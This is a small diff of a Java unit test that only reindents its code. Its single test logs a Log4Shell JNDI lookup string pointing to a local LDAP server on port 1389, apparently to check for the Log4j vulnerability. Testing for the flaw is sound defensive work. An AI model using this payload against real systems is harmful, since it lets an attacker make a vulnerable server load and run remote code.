@@ -11,12 +11,12 @@ import org.slf4j.LoggerFactory;
  */
 public class UtilsTest {
 
-    private final static Logger log = LoggerFactory.getLogger(UtilsTest.class);
+	private final static Logger log = LoggerFactory.getLogger(UtilsTest.class);
 
-    @Test
-    public void util() {
+	@Test
+	public void util() {
 
-        log.error("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
-    }
+		log.error("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
+	}
 
 }
